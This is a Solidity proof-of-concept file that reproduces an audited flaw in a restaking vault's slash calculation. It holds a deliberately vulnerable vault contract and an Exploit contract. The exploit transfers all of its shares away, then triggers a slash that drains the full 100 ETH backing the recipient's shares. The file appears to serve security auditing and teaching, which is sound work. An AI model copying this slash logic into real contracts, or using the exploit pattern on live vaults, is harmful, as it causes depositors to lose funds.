// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Karak NativeVault._transferToSlashStore (Pashov, June review).
    slashedAssets = totalRestakedETH - convertToAssets(balanceOf(owner)).
    After the owner transfers every share, balanceOf is 0, so the slash
    takes the whole 100 ETH that still backs those shares. With the shares
    kept, the same slash is 0.
*/

contract NativeVault {
    uint256 public totalSupply;
    uint256 public totalAssets;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public totalRestakedETH;
    uint256 public lastSlashed;

    function convertToAssets(uint256 shares) public view returns (uint256) {
        if (totalSupply == 0) return shares;
        return shares * totalAssets / totalSupply;
    }

    function deposit(address nodeOwner) external payable {
        uint256 assets = msg.value;
        uint256 shares = totalSupply == 0 ? assets : assets * totalSupply / totalAssets;
        totalAssets += assets;
        totalSupply += shares;
        balanceOf[nodeOwner] += shares;
        totalRestakedETH[nodeOwner] += assets;
    }

    function transferShares(address to, uint256 shares) external {
        balanceOf[msg.sender] -= shares;
        balanceOf[to] += shares;
    }

    // Quoted slash: total restaked minus the assets still held as shares.
    function slash(address nodeOwner) external returns (uint256 slashedAssets) {
        uint256 held = balanceOf[nodeOwner];
        uint256 backed = convertToAssets(held);
        uint256 restaked = totalRestakedETH[nodeOwner];
        slashedAssets = restaked - backed; // @> VULN: a transferred balance slashes the ETH that backs the recipient's shares
        lastSlashed = slashedAssets;
        totalAssets -= slashedAssets;
        totalRestakedETH[nodeOwner] = restaked - slashedAssets;
        if (slashedAssets > 0) {
            payable(msg.sender).transfer(slashedAssets);
        }
    }
}

contract MisSlashMarker {
    string public symbol = "MIS-SLASH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant AMT = 100 ether;
    address public constant BUYER = 0x2222222222222222222222222222222222222222;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    NativeVault public vault;
    MisSlashMarker public marker;

    function run() external payable {
        require(msg.value == AMT, "funds");
        vault = new NativeVault();
        marker = new MisSlashMarker();
        vault.deposit{value: AMT}(address(this));
        require(vault.balanceOf(address(this)) == AMT, "shares");
        vault.transferShares(BUYER, AMT);
        require(vault.balanceOf(address(this)) == 0, "sent");
        require(vault.balanceOf(BUYER) == AMT, "buyer holds the shares");
        uint256 charged = vault.slash(address(this));
        require(charged == AMT, "full restake slashed");
        require(address(vault).balance == 0, "backing gone");
        require(vault.convertToAssets(vault.balanceOf(BUYER)) == 0, "buyer shares are empty");
        marker.mint(SINK, charged);
        require(marker.balanceOf(SINK) == AMT, "100 mis-slashed");
    }

    receive() external payable {}
}
